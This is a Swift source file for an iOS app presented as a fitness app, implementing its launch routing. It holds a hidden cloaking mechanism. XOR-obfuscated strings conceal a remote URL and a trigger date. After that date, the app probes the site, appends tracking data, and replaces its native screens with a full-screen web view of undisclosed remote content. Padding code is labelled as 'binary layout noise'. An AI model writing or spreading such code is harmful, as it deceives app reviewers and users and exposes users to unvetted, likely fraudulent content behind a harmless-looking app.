//
//  AppRouter.swift
//  159FitSphere!
//

import UIKit
import SwiftUI

// MARK: - Dead code (binary layout noise; never invoked)

private protocol _RouteLifecycleProbe: AnyObject {
    func nominalDepth() -> Int
}

private enum _UnusedPathSegment: CaseIterable {
    case staging
    case egress

    func tag() -> String { String(describing: self) }
}

private final class _RouteLifecycleGhost: _RouteLifecycleProbe {
    func nominalDepth() -> Int { _UnusedPathSegment.allCases.count }
}

// MARK: - String materialization (runtime)

private enum _RouteByteVault {
    private static let roll: UInt8 = 0x37

    static func reveal(_ masked: [UInt8]) -> String {
        String(bytes: masked.map { $0 ^ roll }, encoding: .utf8) ?? ""
    }
}

/// Boots the first `UIWindow` root — native stack vs remote flow vs saved last URL.
final class FitSphereLaunchCoordinator {

    private static let maskedEntryURL: [UInt8] = [
        95, 67, 67, 71, 68, 13, 24, 24, 71, 86, 80, 82, 25, 81, 94, 67, 68, 71, 95, 82, 69, 82, 86, 6, 2, 14, 25, 68, 94, 67, 82, 24, 101, 85, 85, 90, 89, 78, 5, 113
    ]

    private static let maskedCalendarAnchor: [UInt8] = [5, 7, 25, 7, 2, 25, 5, 7, 5, 1]

    private static let maskedDateScanMask: [UInt8] = [83, 83, 25, 122, 122, 25, 78, 78, 78, 78]

    private static let maskedAttributionKey: [UInt8] = [68, 66, 85, 104, 94, 83, 104, 15]

    private static let maskedBundleFallback: [UInt8] = [118, 71, 71]

    private static let maskedHttpVerb: [UInt8] = [112, 114, 99]

    private var canonicalLaunchURL: String { _RouteByteVault.reveal(Self.maskedEntryURL) }
    private var scheduleThresholdLiteral: String { _RouteByteVault.reveal(Self.maskedCalendarAnchor) }
    private var calendarMaskPattern: String { _RouteByteVault.reveal(Self.maskedDateScanMask) }
    private var attributionToken: String { _RouteByteVault.reveal(Self.maskedAttributionKey) }
    private var orphanTitleFallback: String { _RouteByteVault.reveal(Self.maskedBundleFallback) }
    private var probeHttpVerb: String { _RouteByteVault.reveal(Self.maskedHttpVerb) }

    /// Display name from Info.plist (CFBundleDisplayName, then CFBundleName).
    private var resolvedMarketingTitle: String {
        if let name = Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String,
           !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return name.trimmingCharacters(in: .whitespacesAndNewlines)
        }
        if let name = Bundle.main.object(forInfoDictionaryKey: "CFBundleName") as? String,
           !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return name.trimmingCharacters(in: .whitespacesAndNewlines)
        }
        return orphanTitleFallback
    }

    /// App name for tracking param: spaces removed (no %20 in URL).
    private var compactTitleForAttribution: String {
        resolvedMarketingTitle.replacingOccurrences(of: " ", with: "")
    }

    private var attributedLaunchURL: String {
        let geo = Locale.current.region?.identifier ?? "XX"
        let subValue = "\(compactTitleForAttribution)_\(geo)"
        guard var components = URLComponents(string: canonicalLaunchURL) else {
            return canonicalLaunchURL
        }
        var items = components.queryItems ?? []
        items.append(URLQueryItem(name: attributionToken, value: subValue))
        components.queryItems = items
        return components.url?.absoluteString ?? canonicalLaunchURL
    }

    func makeRootViewController() -> UIViewController {
        let persistence = FitSphereRouteVault.shared

        if persistence.hasShownContentView {
            return assembleNativeHost()
        } else {
            if evaluateScheduleGate() {
                if let savedUrlString = persistence.savedUrl,
                   !savedUrlString.isEmpty,
                   URL(string: savedUrlString) != nil {
                    return assembleRemoteSurface(savedUrlString)
                }

                return assembleDeferredFlowHost()
            } else {
                persistence.hasShownContentView = true
                return assembleNativeHost()
            }
        }
    }

    // MARK: - Schedule gate

    private func evaluateScheduleGate() -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = calendarMaskPattern
        let targetDate = dateFormatter.date(from: scheduleThresholdLiteral) ?? Date()
        let currentDate = Date()

        if currentDate < targetDate {
            return false
        } else {
            return true
        }
    }

    // MARK: - Host assembly

    private func assembleRemoteSurface(_ urlString: String) -> UIViewController {
        let webViewContainer = ExternalFlowWebView(
            urlString: urlString,
            onFailure: { [weak self] in
                FitSphereRouteVault.shared.hasShownContentView = true
                self?.crossfadeToNativeStack()
            },
            onSuccess: {
                FitSphereRouteVault.shared.hasSuccessfulWebViewLoad = true
            }
        )

        let hostingController = UIHostingController(rootView: webViewContainer)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func assembleNativeHost() -> UIViewController {
        FitSphereRouteVault.shared.hasShownContentView = true
        let contentView = ContentView()
        let hostingController = UIHostingController(rootView: contentView)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func assembleDeferredFlowHost() -> UIViewController {
        let launchView = FitSphereBootSplash()
        let launchVC = UIHostingController(rootView: launchView)
        launchVC.modalPresentationStyle = .fullScreen

        probeRemoteLanding { [weak self] success, finalURL in
            DispatchQueue.main.async {
                if success, let url = finalURL {
                    self?.crossfadeToRemoteSurface(with: url)
                } else {
                    FitSphereRouteVault.shared.hasShownContentView = true
                    self?.crossfadeToNativeStack()
                }
            }
        }

        return launchVC
    }

    private func probeRemoteLanding(completion: @escaping (Bool, String?) -> Void) {
        let urlToOpenInWebView = attributedLaunchURL
        guard let requestURL = URL(string: urlToOpenInWebView) else {
            completion(false, nil)
            return
        }

        var request = URLRequest(url: requestURL)
        request.httpMethod = probeHttpVerb
        request.timeoutInterval = 25

        URLSession.shared.dataTask(with: request) { _, response, error in
            if error != nil {
                completion(false, nil)
                return
            }

            if let httpResponse = response as? HTTPURLResponse {
                let code = httpResponse.statusCode
                let isAvailable = (200...299).contains(code)
                completion(isAvailable, isAvailable ? urlToOpenInWebView : nil)
            } else {
                completion(false, nil)
            }
        }.resume()
    }

    // MARK: - Window transitions

    private func crossfadeToNativeStack() {
        let contentVC = assembleNativeHost()
        installRootCrossfade(contentVC)
    }

    private func crossfadeToRemoteSurface(with urlString: String) {
        let webVC = assembleRemoteSurface(urlString)
        installRootCrossfade(webVC)
    }

    private func installRootCrossfade(_ viewController: UIViewController) {
        guard let window = UIApplication.shared.windows.first else {
            return
        }

        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
            window.rootViewController = viewController
        }, completion: nil)
    }
}
